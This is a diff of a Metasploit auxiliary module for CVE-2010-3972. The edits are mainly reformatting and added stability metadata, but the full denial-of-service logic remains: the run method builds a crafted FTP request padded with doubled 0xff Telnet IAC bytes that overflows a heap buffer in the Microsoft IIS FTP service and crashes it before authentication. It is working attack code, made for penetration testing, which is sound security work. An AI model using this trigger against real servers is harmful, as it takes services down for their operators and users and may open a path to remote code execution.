@@ -8,24 +8,24 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft IIS FTP Server Encoded Response Overflow Trigger',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft IIS FTP Server Encoded Response Overflow Trigger',
+        'Description' => %q{
           This module triggers a heap overflow when processing a specially crafted
-        FTP request containing Telnet IAC (0xff) bytes. When constructing the response,
-        the Microsoft IIS FTP Service overflows the heap buffer with 0xff bytes.
+          FTP request containing Telnet IAC (0xff) bytes. When constructing the response,
+          the Microsoft IIS FTP Service overflows the heap buffer with 0xff bytes.
 
-        This issue can be triggered pre-auth and may in fact be exploitable for
-        remote code execution.
-      },
-      'Author'         =>
-        [
-          'Matthew Bergin',  # Original discovery/disclosure
-          'jduck'            # Metasploit module
+          This issue can be triggered pre-auth and may in fact be exploitable for
+          remote code execution.
+        },
+        'Author' => [
+          'Matthew Bergin', # Original discovery/disclosure
+          'jduck' # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2010-3972' ],
           [ 'OSVDB', '70167' ],
           [ 'BID', '45542' ],
@@ -33,14 +33,21 @@ class MetasploitModule < Msf::Auxiliary
           [ 'EDB', '15803' ],
           [ 'URL', 'https://msrc-blog.microsoft.com/2010/12/22/assessing-an-iis-ftp-7-5-unauthenticated-denial-of-service-vulnerability/' ]
         ],
-      'DisclosureDate' => '2010-12-21'))
+        'DisclosureDate' => '2010-12-21',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(21)
-      ])
+      ]
+    )
   end
-
 
   def run
     connect
@@ -51,18 +58,19 @@ class MetasploitModule < Msf::Auxiliary
     buf = Rex::Text.pattern_create(1024)
 
     # the 0xff's must be doubled, the server will un-and-re-double them.
-    ffs = "\xff" * (0x7e*2)
+    ffs = "\xff" * (0x7e * 2)
 
     # Continuing after the first exception sometimes leads to this being dereferenced.
-    buf[0,3] = [0xdeadbe00].pack('V')[1,3]
+    buf[0, 3] = [0xdeadbe00].pack('V')[1, 3]
 
-    buf[4,ffs.length] = ffs
+    buf[4, ffs.length] = ffs
     buf << "\r\n"
 
     sock.put(buf)
 
     disconnect
-  rescue ::Rex::ConnectionError
+  rescue ::Rex::ConnectionError => e
+    vprint_error(e.message)
   end
 end
 
